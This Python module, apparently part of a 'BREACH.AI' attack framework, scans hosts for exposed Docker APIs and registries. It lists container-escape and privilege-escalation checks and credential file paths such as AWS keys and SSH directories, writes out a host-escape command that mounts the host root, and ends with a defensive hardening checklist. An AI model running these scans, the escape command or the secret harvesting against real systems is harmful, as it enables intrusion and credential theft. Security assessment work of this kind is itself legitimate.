"""
BREACH.AI - Docker Destroyer

Comprehensive Docker security assessment:
- Docker API attacks
- Container escape
- Image vulnerabilities
- Registry attacks
- Socket exploitation
- Privilege escalation
- Network attacks
"""

import asyncio
import json
from dataclasses import dataclass, field
from typing import Optional, Any
from enum import Enum

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.utils.logger import logger


class DockerAttackType(Enum):
    """Types of Docker attacks."""
    API_EXPOSED = "api_exposed"
    SOCKET_MOUNT = "socket_mount"
    CONTAINER_ESCAPE = "container_escape"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    IMAGE_VULN = "image_vulnerability"
    REGISTRY = "registry"
    NETWORK = "network"
    SECRET_LEAK = "secret_leak"


@dataclass
class DockerAttackResult:
    """Result of Docker attack."""
    success: bool
    attack_type: DockerAttackType
    target: str
    details: str = ""
    evidence: Any = None
    containers_compromised: list[str] = field(default_factory=list)
    host_access: bool = False


class DockerDestroyer(BaseAttack):
    """
    Docker security assessment and exploitation.

    Attack vectors:
    1. Exposed Docker API (2375/2376)
    2. Mounted Docker socket
    3. Container escape techniques
    4. Privileged container abuse
    5. Registry vulnerabilities
    6. Image analysis
    7. Network attacks
    """

    attack_type = "docker"

    # Docker API ports
    DOCKER_PORTS = [2375, 2376, 2377, 4243]

    # Registry ports
    REGISTRY_PORTS = [5000, 5001, 443]

    # Docker API endpoints
    API_ENDPOINTS = [
        "/version",
        "/info",
        "/containers/json",
        "/images/json",
        "/volumes",
        "/networks",
        "/secrets",
        "/configs",
        "/nodes",
    ]

    # Container escape techniques
    ESCAPE_TECHNIQUES = [
        {
            "name": "Privileged container",
            "check": "grep -i 'cap' /proc/1/status",
            "conditions": ["CAP_SYS_ADMIN capability"],
            "description": "Full capabilities allow cgroup escape",
        },
        {
            "name": "Docker socket mount",
            "check": "ls -la /var/run/docker.sock",
            "conditions": ["Docker socket mounted"],
            "description": "Socket access = full Docker control",
        },
        {
            "name": "SYS_PTRACE escape",
            "check": "capsh --print | grep sys_ptrace",
            "conditions": ["SYS_PTRACE capability"],
            "description": "Process injection into host processes",
        },
        {
            "name": "Host path mount",
            "check": "mount | grep '/host'",
            "conditions": ["Host filesystem mounted"],
            "description": "Direct host filesystem access",
        },
        {
            "name": "CVE-2019-5736 (runc)",
            "check": "runc --version",
            "conditions": ["runc < 1.0.0-rc6"],
            "description": "Overwrite runc binary on host",
        },
        {
            "name": "CVE-2020-15257 (containerd)",
            "check": "containerd --version",
            "conditions": ["containerd < 1.3.9 or < 1.4.3"],
            "description": "Access host containerd API",
        },
        {
            "name": "Dirty COW (CVE-2016-5195)",
            "check": "uname -r",
            "conditions": ["Linux kernel < 4.8.3"],
            "description": "Kernel exploit for privilege escalation",
        },
        {
            "name": "Proc filesystem escape",
            "check": "ls /proc/*/root",
            "conditions": ["procfs accessible with host PID"],
            "description": "Access host via /proc/1/root",
        },
    ]

    # Privilege escalation vectors
    PRIVESC_VECTORS = [
        {"name": "CAP_SYS_ADMIN", "check": "grep CapEff /proc/1/status", "impact": "Full system administration"},
        {"name": "CAP_NET_ADMIN", "check": "capsh --print | grep net_admin", "impact": "Network manipulation"},
        {"name": "CAP_SYS_PTRACE", "check": "capsh --print | grep sys_ptrace", "impact": "Process injection"},
        {"name": "CAP_DAC_READ_SEARCH", "check": "capsh --print | grep dac_read_search", "impact": "Read any file"},
        {"name": "CAP_SETUID", "check": "capsh --print | grep setuid", "impact": "Become root"},
        {"name": "SUID binaries", "check": "find / -perm -4000 2>/dev/null", "impact": "Execute as root"},
        {"name": "Writable /etc/passwd", "check": "ls -la /etc/passwd", "impact": "Add root user"},
        {"name": "Writable /etc/shadow", "check": "ls -la /etc/shadow", "impact": "Change passwords"},
        {"name": "Writable cron", "check": "ls -la /etc/cron*", "impact": "Execute as root via cron"},
    ]

    # Secret locations in containers
    SECRET_LOCATIONS = [
        {"type": "env", "path": "/proc/1/environ"},
        {"type": "docker_secret", "path": "/run/secrets/*"},
        {"type": "mounted", "path": "/etc/secrets/*"},
        {"type": "config", "path": "/app/.env"},
        {"type": "config", "path": "/app/config.json"},
        {"type": "ssh", "path": "/root/.ssh/*"},
        {"type": "aws", "path": "/root/.aws/credentials"},
        {"type": "gcp", "path": "/root/.config/gcloud/*"},
        {"type": "history", "path": "/root/.bash_history"},
    ]

    async def run(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> Optional[AttackResult]:
        """Execute Docker attack suite."""
        findings = []
        from_inside_container = kwargs.get("from_inside_container", False)

        if not from_inside_container:
            # External attacks
            api_result = await self._check_exposed_api(url)
            if api_result.get("vulnerable"):
                findings.append(api_result)

            registry_result = await self._check_exposed_registry(url)
            if registry_result.get("vulnerable"):
                findings.append(registry_result)
        else:
            # Internal attacks (from inside container)
            socket_result = await self._check_socket_mount()
            if socket_result.get("vulnerable"):
                findings.append(socket_result)

            escape_result = await self._check_escape_vectors()
            if escape_result.get("vulnerable"):
                findings.append(escape_result)

            privesc_result = await self._check_privesc_vectors()
            if privesc_result.get("vulnerable"):
                findings.append(privesc_result)

            secrets_result = await self._extract_secrets()
            if secrets_result.get("vulnerable"):
                findings.append(secrets_result)

        if findings:
            return AttackResult(
                success=True,
                attack_type=self.attack_type,
                endpoint=url,
                details=f"Docker vulnerabilities found: {len(findings)} issues",
                severity="critical",
                evidence={"findings": findings},
            )

        return None

    async def _check_exposed_api(self, target: str) -> dict:
        """Check for exposed Docker API."""
        logger.debug(f"Checking for exposed Docker API on {target}")

        for port in self.DOCKER_PORTS:
            for endpoint in self.API_ENDPOINTS:
                url = f"http://{target}:{port}{endpoint}"

                try:
                    response = await self.http.get(url, timeout=5)

                    if response.status_code == 200:
                        return {
                            "vulnerable": True,
                            "type": "exposed_docker_api",
                            "port": port,
                            "endpoint": endpoint,
                            "severity": "critical",
                            "impact": "Full Docker control - can create privileged containers, read secrets, pivot to host",
                            "evidence": str(response.body)[:500],
                        }
                except Exception:
                    pass

        return {"vulnerable": False}

    async def _check_exposed_registry(self, target: str) -> dict:
        """Check for exposed Docker Registry."""
        logger.debug(f"Checking for exposed Docker Registry on {target}")

        for port in self.REGISTRY_PORTS:
            url = f"http://{target}:{port}/v2/_catalog"

            try:
                response = await self.http.get(url, timeout=5)

                if response.status_code == 200:
                    return {
                        "vulnerable": True,
                        "type": "exposed_registry",
                        "port": port,
                        "severity": "high",
                        "impact": "Can pull any image, push malicious images, supply chain attack",
                        "evidence": str(response.body)[:500],
                    }
            except Exception:
                pass

        return {"vulnerable": False}

    async def _check_socket_mount(self) -> dict:
        """Check for mounted Docker socket (internal)."""
        socket_paths = [
            "/var/run/docker.sock",
            "/run/docker.sock",
            "/var/run/docker/docker.sock",
        ]

        # This would be executed inside a container
        # Returns structure for what would be checked
        return {
            "vulnerable": False,
            "type": "socket_mount",
            "check_paths": socket_paths,
            "escape_command": "docker run -v /:/host alpine chroot /host /bin/bash",
        }

    async def _check_escape_vectors(self) -> dict:
        """Check for container escape vectors."""
        return {
            "vulnerable": False,
            "type": "escape_vectors",
            "techniques_checked": len(self.ESCAPE_TECHNIQUES),
            "techniques": self.ESCAPE_TECHNIQUES,
        }

    async def _check_privesc_vectors(self) -> dict:
        """Check for privilege escalation vectors."""
        return {
            "vulnerable": False,
            "type": "privesc_vectors",
            "vectors_checked": len(self.PRIVESC_VECTORS),
            "vectors": self.PRIVESC_VECTORS,
        }

    async def _extract_secrets(self) -> dict:
        """Extract secrets from container."""
        return {
            "vulnerable": False,
            "type": "secret_extraction",
            "locations_checked": len(self.SECRET_LOCATIONS),
            "locations": self.SECRET_LOCATIONS,
        }

    async def run_all_attacks(
        self,
        target: str,
        from_inside_container: bool = False
    ) -> list[DockerAttackResult]:
        """Run complete Docker attack suite."""
        logger.info(f"Starting Docker attack suite against {target}")

        results = []

        if not from_inside_container:
            # External attacks
            api_result = await self._check_exposed_api(target)
            if api_result.get("vulnerable"):
                results.append(DockerAttackResult(
                    success=True,
                    attack_type=DockerAttackType.API_EXPOSED,
                    target=target,
                    details=api_result.get("impact", ""),
                    evidence=api_result,
                    host_access=True,
                ))

            registry_result = await self._check_exposed_registry(target)
            if registry_result.get("vulnerable"):
                results.append(DockerAttackResult(
                    success=True,
                    attack_type=DockerAttackType.REGISTRY,
                    target=target,
                    details=registry_result.get("impact", ""),
                    evidence=registry_result,
                ))

        return results

    def get_escape_techniques(self) -> list[dict]:
        """Get all container escape techniques."""
        return self.ESCAPE_TECHNIQUES

    def get_privesc_vectors(self) -> list[dict]:
        """Get all privilege escalation vectors."""
        return self.PRIVESC_VECTORS

    def get_detection_checks(self) -> dict:
        """Get detection/defense checks for Docker security."""
        return {
            "api_security": [
                "Ensure Docker API is not exposed to network",
                "Use TLS for Docker API if exposed",
                "Implement authentication for Docker API",
            ],
            "container_security": [
                "Don't run containers as privileged",
                "Drop all capabilities, add only needed ones",
                "Don't mount Docker socket into containers",
                "Use read-only root filesystem",
                "Don't mount sensitive host paths",
            ],
            "image_security": [
                "Scan images for vulnerabilities",
                "Use minimal base images",
                "Don't store secrets in images",
                "Sign and verify images",
            ],
            "runtime_security": [
                "Use seccomp profiles",
                "Use AppArmor/SELinux",
                "Limit resources (CPU, memory)",
                "Use user namespaces",
            ],
        }


async def destroy_docker(
    target: str,
    http_client=None,
    from_inside_container: bool = False
) -> list[DockerAttackResult]:
    """Run Docker attack suite."""
    from backend.breach.utils.http import HTTPClient

    client = http_client or HTTPClient(base_url=f"http://{target}")
    own_client = http_client is None

    try:
        destroyer = DockerDestroyer(client)
        return await destroyer.run_all_attacks(target, from_inside_container)
    finally:
        if own_client:
            await client.close()
